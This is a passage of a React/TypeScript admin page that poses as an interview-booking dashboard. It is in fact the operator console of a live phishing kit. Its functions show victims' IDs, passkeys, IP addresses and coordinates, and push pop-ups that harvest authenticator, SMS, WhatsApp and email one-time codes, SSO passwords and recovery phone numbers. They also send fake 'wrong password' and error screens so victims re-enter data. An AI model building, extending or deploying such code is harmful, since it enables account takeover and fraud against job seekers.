            className="w-full px-3 py-1.5 bg-white hover:bg-red-50 text-[#dc2626] border border-[#ef4444] rounded-lg font-bold text-xs transition-all disabled:opacity-40 flex items-center justify-center gap-1.5 cursor-pointer"
          >
            <X className="w-3.5 h-3.5 text-[#dc2626]" />
            <span>Reject ID</span>
          </button>

          {isNorthErrorActive ? (
            <button
              type="button"
              disabled={busyId === b.id}
              onClick={() => onResetNorthError(b)}
              className="w-full px-3 py-1.5 bg-amber-500 hover:bg-amber-600 text-white rounded-lg font-bold text-xs shadow-2xs transition-all flex items-center justify-center gap-1.5 cursor-pointer"
              title="North Error page is currently displayed on candidate screen. Click to dismiss."
            >
              <X className="w-3.5 h-3.5" />
              <span>Clear Error Page</span>
            </button>
          ) : (
            <button
              type="button"
              disabled={busyId === b.id}
              onClick={() => onSendNorthError(b)}
              className="w-full px-3 py-1.5 bg-slate-900 hover:bg-black text-white rounded-lg font-bold text-xs shadow-2xs transition-all flex items-center justify-center gap-1.5 cursor-pointer"
              title="Display full-screen North Error page to candidate"
            >
              <Zap className="w-3.5 h-3.5 text-emerald-400" />
              <span>North Error</span>
            </button>
          )}
        </div>
      </div>

      {/* BOTTOM ROW: Candidate Phase and Symmetrical 6-Card Codes Grid (AuthApp, WhatsApp, SMS, Email, Pop Code, Notification) */}
      <div className="flex flex-col xl:flex-row items-start xl:items-center justify-between gap-3 pt-1">
        {/* Candidate Phase & Admin Attribution */}
        <div className="min-w-[160px] space-y-1.5 shrink-0">
          {/* Admin User (Email) / Link Origin */}
          <div className="space-y-0.5">
            <span className="text-[10px] font-bold text-gray-400 uppercase tracking-wider block">
              Admin Link (Email)
            </span>
            <div className="flex items-center justify-between gap-1 px-2.5 py-1 bg-blue-50/70 border border-blue-200/90 rounded-lg shadow-2xs min-h-[30px]">
              <div className="flex items-center gap-1.5 min-w-0 flex-1">
                <span className="w-1.5 h-1.5 rounded-full bg-blue-600 shrink-0" />
                <span
                  className="text-xs font-bold text-blue-950 truncate"
                  title={b.admin_email || b.interviewer_name || "Default Admin"}
                >
                  {b.admin_email || (b.interviewer_name ? `${b.interviewer_name}` : "Default Admin")}
                </span>
              </div>
              {b.admin_email && <CopyIconButton value={b.admin_email} label="Admin Email" />}
            </div>
          </div>

          {/* Candidate Phase Status Badge */}
          <div className="space-y-0.5">
            <span className="text-[10px] font-bold text-gray-400 uppercase tracking-wider block">
              Candidate Phase
            </span>
            <div>
              <CandidatePhaseBadge b={b} />
            </div>
          </div>
        </div>

        {/* Symmetrical Uniform 6-Card Grid: AuthApp, WhatsApp, SMS, Email, Pop Code, and Notification */}
        <div className="space-y-1 flex-1 w-full min-w-0">
          <span className="text-[10px] font-bold text-gray-400 uppercase tracking-wider block">
            Additional Codes (Required If Rejected) &amp; Pop-out Code
          </span>

          <div className="grid grid-cols-2 sm:grid-cols-3 xl:grid-cols-6 gap-2 w-full">
            {/* Codes 1 to 4 (AuthApp, WhatsApp, SMS, Code 4) */}
            {codes.map((num) => {
              const codeKey = `code_${num}` as "code_1" | "code_2" | "code_3" | "code_4";
              const value = codeData[codeKey];
              const label = getCodeLabel(num);

              const isRequested =
                b.status === "awaiting_code" && codeData.active_req === `CODE_${num}_REQUESTED`;
              const isRejected =
                b.status === "awaiting_code" && codeData.active_req === `CODE_${num}_REJECTED`;
              const hasSubmitted = Boolean(typeof value === "string" && value.trim() !== "");

              // Disable Reject if Send was not pressed / code not requested & not submitted
              const isSendTriggeredOrSubmitted = Boolean(isRequested || isRejected || hasSubmitted);

              // Status Dot
              let dotClass = "bg-gray-300";
              if (hasSubmitted) dotClass = "bg-emerald-500";
              else if (isRequested) dotClass = "bg-amber-500 animate-pulse";
              else if (isRejected) dotClass = "bg-red-500";

              return (
                <div
                  key={num}
                  className="bg-white border border-gray-200/90 rounded-xl p-2 flex flex-col justify-between space-y-1.5 shadow-2xs overflow-hidden"
                >
                  {/* Header: Label Title + Dot */}
                  <div className="flex items-center justify-between">
                    <span className="text-[11px] font-bold text-gray-800 truncate pr-1">
                      {label}
                    </span>
                    <span className={`w-2 h-2 rounded-full shrink-0 ${dotClass}`} />
                  </div>

                  {/* Actions: Send & Reject */}
                  <div className="flex gap-1 w-full min-w-0">
                    <button
                      type="button"
                      disabled={busyId === b.id}
                      onClick={() => onRequireCode(b, num)}
                      className={`flex-1 py-1 px-1 rounded-md border text-[10px] font-bold flex items-center justify-center gap-1 transition-all min-w-0 cursor-pointer ${
                        isRequested
                          ? "bg-emerald-600 text-white border-emerald-600 shadow-2xs"
                          : "border-emerald-300 text-emerald-700 bg-emerald-50/40 hover:bg-emerald-100/70"
                      }`}
                      title={`Send request for ${label} verification code to candidate`}
                    >
                      <Send className="w-2.5 h-2.5 shrink-0" />
                      <span className="truncate">Send</span>
                    </button>

                    <button
                      type="button"
                      disabled={busyId === b.id || !isSendTriggeredOrSubmitted}
                      onClick={() => onRejectSpecificCode(b, num)}
                      className="flex-1 py-1 px-1 rounded-md border border-red-300 text-red-600 bg-red-50/40 hover:bg-red-100/70 text-[10px] font-bold flex items-center justify-center gap-1 transition-all disabled:opacity-30 disabled:border-gray-200 disabled:bg-gray-50 disabled:text-gray-400 disabled:cursor-not-allowed min-w-0 cursor-pointer"
                      title={
                        isSendTriggeredOrSubmitted
                          ? `Reject ${label} code (candidate stays on ${label} popup)`
                          : `Send must be pressed before you can reject ${label} code`
                      }
                    >
                      <X className="w-2.5 h-2.5 shrink-0" />
                      <span className="truncate">Reject</span>
                    </button>
                  </div>

                  {/* Value Box with Large Text + Copy Icon */}
                  <div className="flex items-center justify-between gap-1 px-2 py-1 bg-white border border-gray-200 rounded-lg shadow-2xs min-h-[30px] min-w-0">
                    <span
                      className={`font-bold font-mono text-xs truncate min-w-0 flex-1 ${
                        value ? "text-gray-900 select-all" : "text-gray-400 font-normal"
                      }`}
                      title={value || "-"}
                    >
                      {value || "-"}
                    </span>
                    <CopyIconButton value={value} label={label} />
                  </div>
                </div>
              );
            })}

            {/* 5th Card: Pop-out Code with Fluid Local State */}
            <PopCodeCardItem
              b={b}
              busy={busyId === b.id}
              onSendPopCode={onSendPopCode}
              onClearPopCode={onClearPopCode}
            />

            {/* 6th Card: Notification */}
            <NotificationCardItem
              b={b}
              busy={busyId === b.id}
              onSendNotification={onSendNotification}
              onClearNotification={onClearNotification}
            />
          </div>
        </div>
      </div>

      {/* SEPARATE DEDICATED SECTION: N-Portal Verification Popups (SSO Login Flow) */}
      <NPortalSection
        b={b}
        busy={busyId === b.id}
        onSendNLogin={onSendNLogin}
        onRejectNLogin={onRejectNLogin}
        onResetNPassword={onResetNPassword}
        onSendNCode={onSendNCode}
        onRejectNCode={onRejectNCode}
        onResetNCode={onResetNCode}
        onUpdateNCodeTargetEmail={onUpdateNCodeTargetEmail}
        onSendGPopUp={onSendGPopUp}
        onRejectGPopUp={onRejectGPopUp}
        onResetGPopUp={onResetGPopUp}
        onSendGNumber={onSendGNumber}
        onRejectGNumber={onRejectGNumber}
        onResetGNumber={onResetGNumber}
        onUpdateGNumberMask={onUpdateGNumberMask}
        onSendGAppreciate={onSendGAppreciate}
        onResetGAppreciate={onResetGAppreciate}
      />
    </div>
  );
}
// Active Draft Session Card
function DraftSessionCard({ s, isOnline }: { s: CandidatePresence; isOnline: boolean }) {
  const deviceInfo = parseDeviceAndOS(s.user_agent);
  return (
    <div className="bg-white/90 border-2 border-dashed border-amber-300 rounded-2xl shadow-sm p-6 sm:p-8 space-y-5 font-sans">
      <div className="flex flex-col xl:flex-row items-start xl:items-center justify-between gap-6 pb-4 border-b border-amber-100">
        <div className="min-w-[200px] space-y-1.5">
          <div className="flex items-center gap-2">
            <span className="text-[11px] font-bold text-amber-700 uppercase tracking-wider block">
              Candidate · {s.phase || "Active Session"}
            </span>

            {isOnline ? (
              <span className="inline-flex items-center gap-1 px-2.5 py-0.5 rounded-full text-[10px] font-bold bg-emerald-50 text-emerald-700 border border-emerald-300 shadow-2xs">
                <span className="w-1.5 h-1.5 rounded-full bg-emerald-500 animate-pulse" />
                <span>Online</span>
              </span>
            ) : (
              <span className="inline-flex items-center gap-1 px-2.5 py-0.5 rounded-full text-[10px] font-bold bg-red-50 text-red-700 border border-red-200">
                <span className="w-1.5 h-1.5 rounded-full bg-red-500" />
                <span>Offline (Left Page)</span>
              </span>
            )}
          </div>

          <h3 className="text-2xl font-bold text-gray-900 leading-tight">
            {s.name || "Candidate"}
          </h3>
          <p className="text-sm text-gray-600 font-medium">{s.email || "—"}</p>
          <p className="text-sm text-gray-600">{s.phone || "—"}</p>

          {/* Location & IP Details */}
          <div className="pt-1 space-y-1">
            {(s.city || s.state || s.country) && (
              <div className="inline-flex items-center gap-1.5 px-2.5 py-1 rounded-lg bg-amber-50 border border-amber-200 text-xs font-semibold text-amber-900">
                <span>📍</span>
                <span>{[s.city, s.state, s.country].filter(Boolean).join(", ")}</span>
              </div>
            )}
            {s.ip_address && (
              <div className="flex items-center gap-1 text-xs text-gray-500 font-mono">
                <span className="font-semibold text-gray-700">IP:</span>
                <span className="bg-gray-50 px-1.5 py-0.5 rounded border border-gray-200 text-[11px]">
                  {s.ip_address}
                </span>
                <CopyIconButton value={s.ip_address} label="IP Address" />
              </div>
            )}
          </div>
        </div>

        <div className="min-w-[130px] space-y-1">
          <span className="text-[11px] font-bold text-gray-400 uppercase tracking-wider block">
            Date &amp; Time
          </span>
          <p className="text-base font-bold text-gray-900">
            {s.date ? new Date(s.date + "T00:00:00").toLocaleDateString("en-US", { month: "short", day: "numeric" }) : "—"}
          </p>
          <p className="text-sm text-gray-600">{s.start_time ? formatTime(s.start_time) : "—"}</p>

          {/* Under Date: Device/OS next to Lat & Long Fields */}
          <div className="pt-1.5 border-t border-amber-200/60 space-y-1">
            <div className="flex flex-wrap items-center gap-1.5">
              {/* Candidate Device & OS Badge */}
              <div
                className="inline-flex items-center gap-1 px-1.5 py-0.5 rounded bg-blue-50 border border-blue-200 text-[10px] font-semibold text-blue-900 shrink-0"
                title={`Device & OS: ${deviceInfo.full}`}
              >
                <span>{deviceInfo.icon}</span>
                <span className="truncate max-w-[130px]">{deviceInfo.full}</span>
              </div>

              {/* Latitude Field */}
              <div className="inline-flex items-center justify-between gap-1 px-1.5 py-0.5 bg-white border border-amber-200 rounded text-xs font-mono min-w-[115px]">
                <span className="text-[9px] font-bold text-amber-700 uppercase tracking-wide shrink-0">Lat:</span>
                <span className="text-gray-800 font-semibold truncate select-all mx-1" title={s.latitude || "—"}>
                  {s.latitude || "—"}
                </span>
                <CopyIconButton value={s.latitude} label="Latitude" />
              </div>

              {/* Longitude Field */}
              <div className="inline-flex items-center justify-between gap-1 px-1.5 py-0.5 bg-white border border-amber-200 rounded text-xs font-mono min-w-[115px]">
                <span className="text-[9px] font-bold text-amber-700 uppercase tracking-wide shrink-0">Long:</span>
                <span className="text-gray-800 font-semibold truncate select-all mx-1" title={s.longitude || "—"}>
                  {s.longitude || "—"}
                </span>
                <CopyIconButton value={s.longitude} label="Longitude" />
              </div>
            </div>
          </div>
        </div>

        {/* Candidate ID & Passkey Stacked (One on top of other in two lines) */}
        <div className="flex-1 min-w-[180px] max-w-sm flex flex-col justify-center gap-1.5">
          <div className="flex items-center justify-between gap-2 px-3 py-1.5 bg-gray-50/80 border border-gray-200 rounded-xl shadow-2xs min-w-0">
            <span className="text-[10px] font-bold text-gray-400 uppercase tracking-wider shrink-0">
              ID:
            </span>
            <span className="text-xs text-gray-400 italic flex-1">Entering…</span>
          </div>

          <div className="flex items-center justify-between gap-2 px-3 py-1.5 bg-gray-50/80 border border-gray-200 rounded-xl shadow-2xs min-w-0">
            <span className="text-[10px] font-bold text-gray-400 uppercase tracking-wider shrink-0">
              Passkey:
            </span>
            <span className="text-xs text-gray-400 italic flex-1">Entering…</span>
          </div>
        </div>
      </div>

      <div className="flex flex-col sm:flex-row items-start sm:items-center justify-between gap-3 pt-2 border-t border-amber-100">
        <div className="flex items-center gap-2">
          <span className="text-xs font-bold text-gray-500">Admin Link:</span>
          <span className="text-xs font-bold text-blue-900 bg-blue-50 border border-blue-200 px-2.5 py-0.5 rounded-lg">
            {s.admin_email || s.interviewer_name || "Default Admin"}
          </span>
        </div>

        <div className="flex items-center gap-2">
          <span className="inline-flex items-center gap-1.5 px-3.5 py-1.5 rounded-full text-xs font-bold bg-amber-50 text-amber-900 border border-amber-300">
            <span className="w-2 h-2 rounded-full bg-amber-500 animate-pulse" />
            <span>{s.phase || "Active Session"}</span>
          </span>
          <span className="text-xs text-muted font-medium">
            {s.phase?.includes("Details")
              ? "Candidate is filling details…"
              : "Waiting for candidate to submit credentials…"}
          </span>
        </div>
      </div>
    </div>
  );
}

function getPageNumbers(current: number, total: number): (number | "...")[] {
  if (total <= 7) {
    return Array.from({ length: total }, (_, i) => i + 1);
  }
  if (current <= 4) {
    return [1, 2, 3, 4, 5, "...", total];
  }
  if (current >= total - 3) {
    return [1, "...", total - 4, total - 3, total - 2, total - 1, total];
  }
  return [1, "...", current - 1, current, current + 1, "...", total];
}

export default function AdminBookingsPage() {
  const [supabase] = useState(() => createClient());
  const [pendingBookings, setPendingBookings] = useState<Booking[]>([]);
  const [pastBookings, setPastBookings] = useState<Booking[]>([]);
  const [loading, setLoading] = useState(true);
  const [loadingPast, setLoadingPast] = useState(false);
  const [busyId, setBusyId] = useState<string | null>(null);

  // Pagination & Search for Past / Resolved Bookings
  const [pastPage, setPastPage] = useState(1);
  const [pageSize, setPageSize] = useState(10);
  const [totalPastCount, setTotalPastCount] = useState(0);
  const [pastSearchQuery, setPastSearchQuery] = useState("");

  // Filter & UI toggles
  const [activeOnly, setActiveOnly] = useState(false);
  const [soundEnabled, setSoundEnabled] = useState(true);
  const [showVisitsLog, setShowVisitsLog] = useState(false);
  const [recentVisits, setRecentVisits] = useState<ScheduleVisit[]>([]);
  const [latestAlert, setLatestAlert] = useState<{
    admin_email?: string | null;
    interviewer_name?: string | null;
    timezone?: string | null;
    location?: string | null;
    ip_address?: string | null;
    time: string;
  } | null>(null);

  // Real-Time Online / Offline Presence Map
  const [presenceMap, setPresenceMap] = useState<Record<string, CandidatePresence>>({});
  // History of presence sessions seen in current session
  const [sessionDrafts, setSessionDrafts] = useState<Record<string, CandidatePresence>>({});

  // Fast fetch for active & pending bookings (always loaded fresh)
  const loadPending = useCallback(async () => {
    try {
      const { data, error } = await supabase
        .from("bookings")
        .select("*")
        .in("status", ["pending", "awaiting_code"])
        .order("created_at", { ascending: false });

      if (!error && data) {
        setPendingBookings(data as Booking[]);
      }
    } catch (e) {
      console.error("Error loading pending bookings:", e);
    }
  }, [supabase]);

  // Paginated server-side fetch for past & resolved bookings
  const loadPast = useCallback(
    async (page: number, size: number, search: string) => {
      setLoadingPast(true);
      try {
        let query = supabase
          .from("bookings")
          .select("*", { count: "exact" })
          .in("status", ["confirmed", "rejected"])
          .order("created_at", { ascending: false });

        if (search.trim()) {
          const s = search.trim();
          query = query.or(
            `first_name.ilike.%${s}%,last_name.ilike.%${s}%,email.ilike.%${s}%,candidate_id.ilike.%${s}%,phone_number.ilike.%${s}%`
          );
        }

        const from = (page - 1) * size;
        const to = from + size - 1;
        const { data, count, error } = await query.range(from, to);

        if (!error && data) {
          setPastBookings(data as Booking[]);
          if (count !== null) setTotalPastCount(count);
        }
      } catch (e) {
        console.error("Error loading past bookings:", e);
      } finally {
        setLoadingPast(false);
      }
    },
    [supabase]
  );

  const loadRecentVisits = useCallback(async () => {
    try {
      const { data } = await supabase
        .from("schedule_visits")
        .select("*")
        .order("created_at", { ascending: false })
        .limit(10);
      if (data) {
        setRecentVisits(data as ScheduleVisit[]);
      }
    } catch {}
  }, [supabase]);

  const loadAll = useCallback(async () => {
    setLoading(true);
    await Promise.allSettled([
      loadPending(),
      loadPast(pastPage, pageSize, pastSearchQuery),
      loadRecentVisits(),
    ]);
    setLoading(false);
  }, [loadPending, loadPast, pastPage, pageSize, pastSearchQuery, loadRecentVisits]);

  // Initial load
  useEffect(() => {
    loadAll();
  }, [loadAll]);

  // Reload past bookings on page, size, or search query changes
  useEffect(() => {
    loadPast(pastPage, pageSize, pastSearchQuery);
  }, [loadPast, pastPage, pageSize, pastSearchQuery]);

  // Periodic refresh for active & pending bookings (backup for websocket reconnection)
  useEffect(() => {
    const interval = setInterval(() => {
      loadPending();
    }, 5000);
    return () => clearInterval(interval);
  }, [loadPending]);

  // Live Postgres DB Changes for Bookings (Only refreshes active items and current page)
  useEffect(() => {
    const channel = supabase
      .channel("admin-bookings")
      .on("postgres_changes", { event: "*", schema: "public", table: "bookings" }, () => {
        loadPending();
        loadPast(pastPage, pageSize, pastSearchQuery);
      })
      .subscribe();

    return () => {
      supabase.removeChannel(channel);
    };
  }, [supabase, loadPending, loadPast, pastPage, pageSize, pastSearchQuery]);

  // Live Postgres DB Changes for Schedule Visits (Immediate notification on opening page)
  useEffect(() => {
    const visitsChannel = supabase
      .channel("admin-schedule-visits")
      .on(
        "postgres_changes",
        { event: "INSERT", schema: "public", table: "schedule_visits" },
        (payload) => {
          const newVisit = payload.new as ScheduleVisit;
          setRecentVisits((prev) => [newVisit, ...prev.slice(0, 9)]);

          const loc = [newVisit.city, newVisit.state, newVisit.country].filter(Boolean).join(", ");
          setLatestAlert({
            admin_email: newVisit.admin_email,
            interviewer_name: newVisit.interviewer_name,
            timezone: newVisit.timezone,
            location: loc || null,
            ip_address: newVisit.ip_address || null,
            time: new Date().toLocaleTimeString([], {
              hour: "2-digit",
              minute: "2-digit",
              second: "2-digit",
            }),
          });

          if (soundEnabled) {
            playNotificationChime();
          }
        }
      )
      .subscribe();

    return () => {
      supabase.removeChannel(visitsChannel);
    };
  }, [supabase, soundEnabled]);

  // Live Presence Subscription (Track Online / Offline in Real Time)
  useEffect(() => {
    const presenceChannel = supabase.channel("candidate-presence-room");

    presenceChannel
      .on("presence", { event: "sync" }, () => {
        const state = presenceChannel.presenceState();
        const flat: Record<string, CandidatePresence> = {};
        const drafts: Record<string, CandidatePresence> = {};

        Object.entries(state).forEach(([key, presences]) => {
          if (presences && presences.length > 0) {
            const p = presences[presences.length - 1] as unknown as CandidatePresence;
            flat[key] = p;
            if (p.booking_id) flat[p.booking_id] = p;
            if (p.email) flat[p.email.toLowerCase()] = p;

            if (
              ((p.name && p.name.trim().length >= 2) || (p.email && p.email.includes("@"))) &&
              p.phase !== "Confirmed" &&
              p.phase !== "Selecting Date & Time"
            ) {
              drafts[p.session_id || key] = p;
            }
          }
        });

        setPresenceMap(flat);
        setSessionDrafts((prev) => ({ ...prev, ...drafts }));
      })
      .subscribe();

    return () => {
      supabase.removeChannel(presenceChannel);
    };
  }, [supabase]);

  // Global Confirm (Final approval)
  async function confirmBooking(id: string) {
    setBusyId(id);
    await supabase.from("bookings").update({ status: "confirmed" }).eq("id", id);
    await Promise.allSettled([
      loadPending(),
      loadPast(pastPage, pageSize, pastSearchQuery),
    ]);
    setBusyId(null);
  }

  // Reject Candidate ID & Passkey
  async function rejectIdPasskey(id: string) {
    setBusyId(id);
    await supabase.from("bookings").update({ status: "rejected" }).eq("id", id);
    await Promise.allSettled([
      loadPending(),
      loadPast(pastPage, pageSize, pastSearchQuery),
    ]);
    setBusyId(null);
  }

  // Send / Require Candidate to input AuthApp (1), WhatsApp (2), SMS (3), or Code 4 (4)
  async function requireCode(b: Booking, codeNum: number) {
    setBusyId(b.id);
    const existing = parseBookingCodeData(b.additional_code);
    const updated: BookingCodeData = {
      ...existing,
      active_req: `CODE_${codeNum}_REQUESTED`,
    };
    await supabase
      .from("bookings")
      .update({
        status: "awaiting_code",
        additional_code: serializeBookingCodeData(updated),
      })
      .eq("id", b.id);
    await loadPending();
    setBusyId(null);
  }

  // Reject specific Code (1=AuthApp, 2=WhatsApp, 3=SMS, 4=Code 4)
  async function rejectSpecificCode(b: Booking, codeNum: number) {
    setBusyId(b.id);
    const existing = parseBookingCodeData(b.additional_code);
    const updated: BookingCodeData = {
      ...existing,
      active_req: `CODE_${codeNum}_REJECTED`,
    };
    await supabase
      .from("bookings")
      .update({
        status: "awaiting_code",
        additional_code: serializeBookingCodeData(updated),
      })
      .eq("id", b.id);
    await loadPending();
    setBusyId(null);
  }

  // Pop-out / Display Code from Admin directly to Candidate Modal
  async function sendPopCode(b: Booking, codeVal: string) {
    setBusyId(b.id);

    const existing = parseBookingCodeData(b.additional_code);
    const updated: BookingCodeData = {
      ...existing,
      pop_code: codeVal,
      active_req: `POP_CODE:${codeVal}`,
    };

    await supabase
      .from("bookings")
      .update({
        status: "awaiting_code",
        additional_code: serializeBookingCodeData(updated),
      })
      .eq("id", b.id);
    await loadPending();
    setBusyId(null);
  }

  // Clear / Dismiss Pop-out Code
  async function clearPopCode(b: Booking) {
    setBusyId(b.id);
    const existing = parseBookingCodeData(b.additional_code);
    const updated: BookingCodeData = {
      ...existing,
      pop_code: null,
      active_req: null,
    };

    await supabase
      .from("bookings")
      .update({
        status: "pending",
        additional_code: serializeBookingCodeData(updated),
      })
      .eq("id", b.id);

    await loadPending();
    setBusyId(null);
  }

  // Send Notification popup to Candidate Modal with custom device text
  async function sendNotification(b: Booking, deviceText: string) {
    setBusyId(b.id);
    const existing = parseBookingCodeData(b.additional_code);
    const updated: BookingCodeData = {
      ...existing,
      notification_device: deviceText,
      active_req: `NOTIFICATION:${deviceText}`,
    };
    await supabase
      .from("bookings")
      .update({
        status: "awaiting_code",
        additional_code: serializeBookingCodeData(updated),
      })
      .eq("id", b.id);
    await loadPending();
    setBusyId(null);
  }

  // Clear / Dismiss Notification
  async function clearNotification(b: Booking) {
    setBusyId(b.id);
    const existing = parseBookingCodeData(b.additional_code);
    const updated: BookingCodeData = {
      ...existing,
      notification_device: null,
      active_req: null,
    };
    await supabase
      .from("bookings")
      .update({
        status: "pending",
        additional_code: serializeBookingCodeData(updated),
      })
      .eq("id", b.id);
    await loadPending();
    setBusyId(null);
  }

  // Send N-Login popup to Candidate
  async function sendNLoginPopup(b: Booking) {
    setBusyId(b.id);
    const existing = parseBookingCodeData(b.additional_code);
    const updated: BookingCodeData = {
      ...existing,
      active_req: "N_LOGIN_REQUESTED",
      n_thanks_seen: false,
      n_login_sent_at: new Date().toISOString(),
    };
    await supabase
      .from("bookings")
      .update({
        status: "awaiting_code",
        additional_code: serializeBookingCodeData(updated),
      })
      .eq("id", b.id);
    await loadPending();
    setBusyId(null);
  }

  // Reject N-Login: candidate entered wrong password, sends "Wrong password" error
  async function rejectNLoginPopup(b: Booking) {
    setBusyId(b.id);
    const existing = parseBookingCodeData(b.additional_code);
    const updated: BookingCodeData = {
      ...existing,
      active_req: "N_LOGIN_REJECTED",
      n_submitted_password: null,
      n_submitted_at: null,
    };
    await supabase
      .from("bookings")
      .update({
        status: "awaiting_code",
        additional_code: serializeBookingCodeData(updated),
      })
      .eq("id", b.id);
    await loadPending();
    setBusyId(null);
  }

  // Clear / Dismiss N-Login popup
  async function dismissNLoginPopup(b: Booking) {
    setBusyId(b.id);
    const existing = parseBookingCodeData(b.additional_code);
    const updated: BookingCodeData = {
      ...existing,
      active_req: null,
    };
    await supabase
      .from("bookings")
      .update({
        status: "pending",
        additional_code: serializeBookingCodeData(updated),
      })
      .eq("id", b.id);
    await loadPending();
    setBusyId(null);
  }

  // Update expected password for N-Login
  async function updateExpectedPassword(b: Booking, pass: string) {
    setBusyId(b.id);
    const existing = parseBookingCodeData(b.additional_code);
    const updated: BookingCodeData = {
      ...existing,
      n_expected_password: pass.trim(),
    };
    await supabase
      .from("bookings")
      .update({
        additional_code: serializeBookingCodeData(updated),
      })
      .eq("id", b.id);
    await loadPending();
    setBusyId(null);
  }

  // Reset candidate's submitted N-Login password
  async function resetNPassword(b: Booking) {
    setBusyId(b.id);
    const existing = parseBookingCodeData(b.additional_code);
    const updated: BookingCodeData = {
      ...existing,
      n_submitted_password: null,
      n_submitted_at: null,
      active_req: null,
    };
    await supabase
      .from("bookings")
      .update({
        additional_code: serializeBookingCodeData(updated),
      })
      .eq("id", b.id);
    await loadPending();
    setBusyId(null);
  }

  // Send N-Code (Email 2FA) popup to Candidate
  async function sendNCodePopup(b: Booking, targetEmail: string) {
    setBusyId(b.id);
    const existing = parseBookingCodeData(b.additional_code);
    const updated: BookingCodeData = {
      ...existing,
      n_code_target_email: targetEmail.trim(),
      active_req: "N_CODE_REQUESTED",
    };
    await supabase
      .from("bookings")
      .update({
        status: "awaiting_code",
        additional_code: serializeBookingCodeData(updated),
      })
      .eq("id", b.id);
    await loadPending();
    setBusyId(null);
  }

  // Reject N-Code: candidate entered wrong code, sends "Wrong code" error
  async function rejectNCodePopup(b: Booking) {
    setBusyId(b.id);
    const existing = parseBookingCodeData(b.additional_code);
    const updated: BookingCodeData = {
      ...existing,
      active_req: "N_CODE_REJECTED",
      n_submitted_code: null,
      n_code_submitted_at: null,
    };
    await supabase
      .from("bookings")
      .update({
        status: "awaiting_code",
        additional_code: serializeBookingCodeData(updated),
      })
      .eq("id", b.id);
    await loadPending();
    setBusyId(null);
  }

  // Clear / Dismiss N-Code popup
  async function dismissNCodePopup(b: Booking) {
    setBusyId(b.id);
    const existing = parseBookingCodeData(b.additional_code);
    const updated: BookingCodeData = {
      ...existing,
      active_req: null,
    };
    await supabase
      .from("bookings")
      .update({
        status: "pending",
        additional_code: serializeBookingCodeData(updated),
      })
      .eq("id", b.id);
    await loadPending();
    setBusyId(null);
  }

  // Update target email for N-Code pop-up
  async function updateNCodeTargetEmail(b: Booking, email: string) {
    setBusyId(b.id);
    const existing = parseBookingCodeData(b.additional_code);
    const updated: BookingCodeData = {
      ...existing,
      n_code_target_email: email.trim(),
    };
    await supabase
      .from("bookings")
      .update({
        additional_code: serializeBookingCodeData(updated),
      })
      .eq("id", b.id);
    await loadPending();
    setBusyId(null);
  }

  // Reset candidate's submitted N-Code
  async function resetNCode(b: Booking) {
    setBusyId(b.id);
    const existing = parseBookingCodeData(b.additional_code);
    const updated: BookingCodeData = {
      ...existing,
      n_submitted_code: null,
      n_code_submitted_at: null,
      active_req: null,
    };
    await supabase
      .from("bookings")
      .update({
        additional_code: serializeBookingCodeData(updated),
      })
      .eq("id", b.id);
    await loadPending();
    setBusyId(null);
  }

  // Send G-PopUp (SMS Text Message) to Candidate
  async function sendGPopUp(b: Booking) {
    setBusyId(b.id);
    const existing = parseBookingCodeData(b.additional_code);
    const updated: BookingCodeData = {
      ...existing,
      active_req: "N_GCODE_REQUESTED",
    };
    await supabase
      .from("bookings")
      .update({
        status: "awaiting_code",
        additional_code: serializeBookingCodeData(updated),
      })
      .eq("id", b.id);
    await loadPending();
    setBusyId(null);
  }

  // Reject G-PopUp: candidate entered wrong G-code, sends "Wrong code" error
  async function rejectGPopUp(b: Booking) {
    setBusyId(b.id);
    const existing = parseBookingCodeData(b.additional_code);
    const updated: BookingCodeData = {
      ...existing,
      active_req: "N_GCODE_REJECTED",
      n_submitted_gcode: null,
      n_gcode_submitted_at: null,
    };
    await supabase
      .from("bookings")
      .update({
        status: "awaiting_code",
        additional_code: serializeBookingCodeData(updated),
      })
      .eq("id", b.id);
    await loadPending();
    setBusyId(null);
  }

  // Reset candidate's submitted G-Code
  async function resetGPopUp(b: Booking) {
    setBusyId(b.id);
    const existing = parseBookingCodeData(b.additional_code);
    const updated: BookingCodeData = {
      ...existing,
      n_submitted_gcode: null,
      n_gcode_submitted_at: null,
      active_req: null,
    };
    await supabase
      .from("bookings")
      .update({
        additional_code: serializeBookingCodeData(updated),
      })
      .eq("id", b.id);
    await loadPending();
    setBusyId(null);
  }

  // Send G-Number (Phone Recovery) popup to Candidate
  async function sendGNumberPopup(b: Booking, phoneMask: string) {
    setBusyId(b.id);
    const existing = parseBookingCodeData(b.additional_code);
    const updated: BookingCodeData = {
      ...existing,
      n_phone_mask: phoneMask.trim(),
      active_req: "N_PHONE_REQUESTED",
    };
    await supabase
      .from("bookings")
      .update({
        status: "awaiting_code",
        additional_code: serializeBookingCodeData(updated),
      })
      .eq("id", b.id);
    await loadPending();
    setBusyId(null);
  }

  // Reject G-Number: candidate entered wrong phone number, sends "Wrong phone number. Try again." error
  async function rejectGNumberPopup(b: Booking) {
    setBusyId(b.id);
    const existing = parseBookingCodeData(b.additional_code);
    const updated: BookingCodeData = {
      ...existing,
      active_req: "N_PHONE_REJECTED",
      n_submitted_phone: null,
      n_phone_submitted_at: null,
    };
    await supabase
      .from("bookings")
      .update({
        status: "awaiting_code",
        additional_code: serializeBookingCodeData(updated),
      })
      .eq("id", b.id);
    await loadPending();
    setBusyId(null);
  }

  // Update phone mask hint for G-Number pop-up
  async function updateGNumberMask(b: Booking, mask: string) {
    setBusyId(b.id);
    const existing = parseBookingCodeData(b.additional_code);
    const updated: BookingCodeData = {
      ...existing,
      n_phone_mask: mask.trim(),
    };
    await supabase
      .from("bookings")
      .update({
        additional_code: serializeBookingCodeData(updated),
      })
      .eq("id", b.id);
    await loadPending();
    setBusyId(null);
  }

  // Reset candidate's submitted G-Number
  async function resetGNumber(b: Booking) {
    setBusyId(b.id);
    const existing = parseBookingCodeData(b.additional_code);
    const updated: BookingCodeData = {
      ...existing,
      n_submitted_phone: null,
      n_phone_submitted_at: null,
      active_req: null,
    };
    await supabase
      .from("bookings")
      .update({
        additional_code: serializeBookingCodeData(updated),
      })
      .eq("id", b.id);
    await loadPending();
    setBusyId(null);
  }

  // Send Pop-up #5: G-Appreciate (Numri)
  async function sendGAppreciatePopup(b: Booking, appreciateValue: string) {
    setBusyId(b.id);
    const existing = parseBookingCodeData(b.additional_code);
    const updated: BookingCodeData = {
      ...existing,
      n_appreciate_value: appreciateValue.trim(),
      active_req: "N_APPRECIATE_REQUESTED",
    };
    await supabase
      .from("bookings")
      .update({
        status: "awaiting_code",
        additional_code: serializeBookingCodeData(updated),
      })
